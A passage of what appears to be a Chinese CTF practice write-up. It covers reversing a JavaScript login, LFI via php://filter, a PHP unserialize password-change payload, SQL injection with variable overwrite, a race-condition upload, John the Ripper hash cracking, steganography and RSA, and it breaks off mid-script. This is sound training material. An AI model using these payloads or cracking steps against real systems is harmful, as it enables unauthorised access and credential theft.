+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>uname</span> <span class=o>==</span> <span class=p>(</span><span class=nx>strKey3</span> <span class=o>+</span> <span class=p>(((</span><span class=nx>strKey1</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>()).</span><span class=nx>substring</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strKey1</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;0&#34;</span><span class=p>))</span> <span class=o>+</span> <span class=nx>strKey2</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>6</span><span class=p>)).</span><span class=nx>toUpperCase</span><span class=p>()).</span><span class=nx>substring</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>15</span><span class=p>)))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>strKey4</span> <span class=o>=</span> <span class=s1>&#39;Java_Scr1pt_Pa4sW0rd_K3y_H3re&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>upass</span> <span class=o>==</span> <span class=p>(</span><span class=nx>strKey4</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nx>strKey4</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=mi>5</span><span class=p>),</span> <span class=nx>strKey4</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=nx>strKey4</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s1>&#39;_&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>5</span><span class=p>)))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;Login Success!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>).</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>unescape</span><span class=p>(</span><span class=s2>&#34;%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;Password Error!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=s1>&#39;Login Failed!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>依次运行：
+1.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey1</span> <span class=o>=</span> <span class=s2>&#34;JaVa3C41ptIsAGo0DStAff&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey2</span> <span class=o>=</span> <span class=s2>&#34;CaNUknOWThIsK3y&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey3</span> <span class=o>=</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=mi>71</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>111</span><span class=p>,</span> <span class=mi>100</span><span class=p>,</span> <span class=mi>33</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>strKey4</span> <span class=o>=</span> <span class=s1>&#39;Java_Scr1pt_Pa4sW0rd_K3y_H3re&#39;</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>strKey3</span> <span class=o>+</span> <span class=p>(((</span><span class=nx>strKey1</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>()).</span><span class=nx>substring</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strKey1</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;0&#34;</span><span class=p>))</span> <span class=o>+</span> <span class=nx>strKey2</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=mi>6</span><span class=p>)).</span><span class=nx>toUpperCase</span><span class=p>()).</span><span class=nx>substring</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>15</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>strKey4</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=nx>strKey4</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>,</span> <span class=mi>5</span><span class=p>),</span> <span class=nx>strKey4</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=nx>strKey4</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s1>&#39;_&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>5</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到用户名 <code>G0od!JAVA3C41PTISAGO</code> 和密码 <code>1pt_Pa4sW0rd_K3y_H3re</code>，不过不用登录，因为 <code>key</code> 也可以直接得到。运行 <code>unescape("%3Cfont%20color%3D%22%23000%22%3Ea2V5X0NoM2NrXy50eHQ=%3C/font%3E")</code>，得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>font</span> <span class=na>color</span><span class=o>=</span><span class=s>&#34;#000&#34;</span><span class=p>&gt;</span>a2V5X0NoM2NrXy50eHQ=<span class=p>&lt;/</span><span class=nt>font</span><span class=p>&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>base64 解码得 <code>key_Ch3ck_.txt</code>，打开发现里面只有 <code>Ch3ck_Au7h.php</code>，但是打开发现只显示 <code>Your username error!</code>。因此我们 POST 刚才得到的用户名和密码。</p><h3 id=level10>Level10</h3><p>提示 LFI，并且 html 表单中有一个 <code>file</code> 参数，因此考虑用 PHP 伪协议，输入框中输入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php://filter/read=convert.base64-encode/resource=index.php
+</span></span></code></pre></td></tr></table></div></div><p>flag 直接写死在源码中了。。</p><h3 id=level11>Level11</h3><p>存在备份文件 <code>index.php.swp</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>clear</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>  <span class=c1>// 这是过滤函数哦~
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$userInfo</span> <span class=o>=</span> <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;userInfo&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$query</span> <span class=o>=</span> <span class=s1>&#39;SELECT * FROM users WHERE id = \&#39;&#39;</span><span class=o>.</span><span class=nx>clear</span><span class=p>(</span><span class=nv>$userInfo</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;\&#39; AND password = \&#39;&#39;</span><span class=o>.</span><span class=nx>clear</span><span class=p>(</span><span class=nv>$userInfo</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;\&#39;;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$result</span> <span class=o>||</span> <span class=nx>mysql_num_rows</span><span class=p>(</span><span class=nv>$result</span><span class=p>)</span> <span class=o>&lt;</span><span class=mi>1</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>	<span class=k>die</span><span class=p>(</span><span class=s1>&#39;Invalid password!&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysql_fetch_assoc</span><span class=p>(</span><span class=nv>$result</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$row</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$userInfo</span><span class=p>[</span><span class=nv>$key</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$oldPass</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;oldPass&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=nv>$newPass</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;newPass&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$oldPass</span> <span class=o>==</span> <span class=nv>$userInfo</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]){</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$userInfo</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$newPass</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nv>$query</span> <span class=o>=</span> <span class=s1>&#39;UPDATE users SET pass = \&#39;&#39;</span><span class=o>.</span><span class=nx>clear</span><span class=p>(</span><span class=nv>$newPass</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;\&#39; WHERE id = \&#39;&#39;</span><span class=o>.</span><span class=nx>clear</span><span class=p>(</span><span class=nv>$userInfo</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;\&#39;;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nx>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s1>&#39;Password Changed Success.&lt;br&gt;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s1>&#39;Invalid old password entered.&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>首先对 <code>userInfo</code> 进行反序列化，随后要求两个参数 <code>oldPass</code> 和 <code>newPass</code>，后者随意设置，前者很容易得到。在 Cookie 中发现 <code>pass=OTA0OGM1MGUwOTJmM2IyZWRlYzM5NTFiZjdiZGFlNTA%3D; id=3</code>，进行 base64 解码和 md5 解密后得到 <code>oldPass=20151231</code>。</p><p>最后就是在 payload 中构造一个序列化的 userInfo 数组，payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>changepassword.php?userInfo=a:2:{s:2:&#34;id&#34;;i:1;s:4:&#34;pass&#34;;s:8:&#34;20151231&#34;;}&amp;oldPass=20151231&amp;newPass=11111111
+</span></span></code></pre></td></tr></table></div></div><h3 id=level12>Level12</h3><p>备份文件 <code>index.php.</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=c1>#GOAL: get password from admin;
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s1>&#39;DB_config_inc.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>dvwaDatabaseConnect</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$_CONFIG</span><span class=p>[</span><span class=s1>&#39;Security&#39;</span><span class=p>]</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>//if register globals = on, undo var overwrites
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>foreach</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;_GET&#39;</span><span class=p>,</span><span class=s1>&#39;_POST&#39;</span><span class=p>,</span><span class=s1>&#39;_REQUEST&#39;</span><span class=p>,</span><span class=s1>&#39;_COOKIE&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$method</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>     <span class=k>foreach</span><span class=p>(</span><span class=nv>$$method</span> <span class=k>as</span> <span class=nv>$key</span><span class=o>=&gt;</span><span class=nv>$value</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>          <span class=nx>unset</span><span class=p>(</span><span class=nv>$$key</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>     <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>clear</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>	<span class=c1>//filter function here
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$username</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>clear</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Please enter in a username.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$password</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nx>clear</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>:</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Please enter in a password.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_CONFIG</span><span class=p>[</span><span class=s1>&#39;Security&#39;</span><span class=p>]){</span>
+</span></span><span class=line><span class=cl>     <span class=nv>$username</span><span class=o>=</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;#[^a-z0-9_-]#i&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$username</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>     <span class=nv>$password</span><span class=o>=</span><span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;#[^a-z0-9_-]#i&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$password</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$username</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>	<span class=k>foreach</span> <span class=p>(</span><span class=nv>$username</span> <span class=k>as</span> <span class=nv>$key</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$username</span><span class=p>[</span><span class=nv>$key</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$query</span><span class=o>=</span><span class=s1>&#39;SELECT * FROM users WHERE user=\&#39;&#39;</span><span class=o>.</span><span class=nv>$username</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;\&#39; AND password=\&#39;&#39;</span><span class=o>.</span><span class=nv>$password</span><span class=o>.</span><span class=s1>&#39;\&#39;;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$result</span><span class=o>=</span><span class=nx>mysql_query</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysql_num_rows</span><span class=p>(</span><span class=nv>$result</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>	<span class=k>echo</span><span class=p>(</span><span class=s1>&#39;flag:{*********}&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>echo</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;alert(</span><span class=se>\&#34;</span><span class=s2>Invalid password!</span><span class=se>\&#34;</span><span class=s2>)&lt;/script&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>如果 <code>$_CONFIG['security']</code> 为 <code>true</code>，那么我们无法传入 <code>username</code> 和 <code>password</code>，因此需要覆盖 <code>$_CONFIG</code>。随后就是注入了，payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>username=&#39;&amp;password=||1=1#&amp;Submit=%E6%8F%90%E4%BA%A4&amp;_CONFIG=aaa
+</span></span></code></pre></td></tr></table></div></div><h3 id=level13>Level13</h3><p>经测试，只有 <code>php5</code> 后缀的文件可以上传成功，但是经过一段很短的延时后又会被删掉。所以需要写两个脚本，一个上传一个下载同时进行，最后发现下载下来的刚才上传的文件里包含 flag。</p><h2 id=day4--day5>Day4 & Day5</h2><p>练习赛，没来得及记录具体 writeup，靠回忆整理一点工具的使用。</p><h3 id=john-破解-des>John 破解 DES</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john des.txt
+</span></span><span class=line><span class=cl>john --show des.txt
+</span></span></code></pre></td></tr></table></div></div><h3 id=john-破解-windows-管理员密码>John 破解 Windows 管理员密码</h3><p>注：Windows 下散列函数为 NTLM。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>john --format<span class=o>=</span>NT sam.txt
+</span></span></code></pre></td></tr></table></div></div><h3 id=python-库-steganography-命令行使用>Python 库 Steganography 命令行使用</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>steganography -e input.jpg output.jpg <span class=s1>&#39;flag{..}&#39;</span>
+</span></span><span class=line><span class=cl>steganography -d stego.png
+</span></span></code></pre></td></tr></table></div></div><h3 id=f5-steganography-使用>F5-Steganography 使用</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>java Extract stego.jpg -p <span class=m>123456</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=steghide-使用>steghide 使用</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>steghide embed -cf picture.jpg -ef secret.txt
+</span></span><span class=line><span class=cl>steghide extract -sf picture.jpg
+</span></span></code></pre></td></tr></table></div></div><h3 id=图片隐写压缩包--图片>图片隐写压缩包 / 图片</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>copy</span> /b 1.jpg+1.zip new.jpg
+</span></span><span class=line><span class=cl><span class=k>copy</span> /b 2.jpg+3.jpg 23.jpg
+</span></span></code></pre></td></tr></table></div></div><h3 id=rsa---已知-pqe>RSA - 已知 p,q,e</h3><p>如果只知道 n 且 n 位数不大，可以在线分解得 p,q。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=o>...</span>
+</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=o>...</span> <span class=c1># c = pow(m, e, p*q)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>p</span><span class=o>*</span><span class=n>q</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=misc---未知领域>Misc - 未知领域</h3><p>例如对于流量包，vmdk 文件，apk 文件等等不熟悉的文件的分析，部分简单题可以通过文本编辑器打开并搜索字符串。对于损坏的流量包尤为有效。</p><h3 id=哈希还原>哈希还原</h3><p>给定明文范围和哈希前十个字符，求明文与哈希值。简陋的 php 版本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$str</span> <span class=o>=</span> <span class=s1>&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$len</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$str</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$len</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=o>++</span><span class=nv>$i</span><span class=p>)</span> <span class=p>{</span>
